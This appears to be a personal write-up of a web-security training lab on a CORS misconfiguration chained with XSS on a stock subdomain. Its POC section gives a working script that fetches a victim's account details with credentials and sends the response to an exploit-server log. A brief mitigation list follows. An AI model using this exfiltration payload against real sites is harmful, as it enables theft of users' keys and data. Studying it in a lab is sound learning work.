# CORS

## LAB 00: ****CORS vulnerability with trusted insecure protocols****

### Overall

![Untitled](CORS%200ace2a07dd5c44448ebc215f283ac5ee/Untitled.png)

Observe that after login the blog, navigate to your profile, beside from your account plain html, account details is receiving via AJAX in JSON format. 

Noted that in the response their are ACAC which indicate that CORS is supporting. And then if we add origin field in our request, the response will reflect the origin field in the response, and only available to same domain only.

![Untitled](CORS%200ace2a07dd5c44448ebc215f283ac5ee/Untitled%201.png)

![Untitled](CORS%200ace2a07dd5c44448ebc215f283ac5ee/Untitled%202.png)

But not the difference domain

![Untitled](CORS%200ace2a07dd5c44448ebc215f283ac5ee/Untitled%203.png)

### Step to reproduce

From here, we want to capture the admin API key which mean we have to find a way that automate run the script over admin panel and send the key back to us.

Go around the blog, we may find a XSS in the product page, check stock function running on subdomain stock.[ lab domain] is vulnerable to XSS, which open a way for us to continue the exploit.

![Untitled](CORS%200ace2a07dd5c44448ebc215f283ac5ee/Untitled%204.png)

![Untitled](CORS%200ace2a07dd5c44448ebc215f283ac5ee/Untitled%205.png)

From here, we will try to perform the CORS attack target to the DOM of the vulnerable page and implement XSS to conduct the CORS attack.

Refer to : 

[CORS - Misconfigurations & Bypass](https://book.hacktricks.xyz/pentesting-web/cors-bypass#from-xss-inside-a-subdomain)

POC

```jsx
<script>
    document.location="http://stock.[ID].web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://[ID].web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-[ID].exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

So, in this case, we will use web-exploit’s log to store the return response from the vulnerable blog that we already push the XSS payload to, the return value will in JSON like we already have an overview above.

![Untitled](CORS%200ace2a07dd5c44448ebc215f283ac5ee/Untitled%206.png)

To the payload, it perform an GET method with point to the /accountDetails page of the admin, because this is in XSS vulnerable context, when the admin visit the stock subdomain, it will perform the left code that will append the content of the response of admin’s /accountDetails to the exploit server’s log at key parameter then send it to the exploit server.

### Mitigation

Solve the XSS vulnerable is extremely recommended.

Specified the allowed origins

Only trusted sites

No null whitelist 

### Appendix

[What are CORS Attacks and How can you Prevent them?](https://www.comparitech.com/blog/information-security/cors-attacks-prevent/)

[XMLHttpRequest - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)

[CORS - Misconfigurations & Bypass](https://book.hacktricks.xyz/pentesting-web/cors-bypass#from-xss-inside-a-subdomain)

[https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html#cors](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html#cors)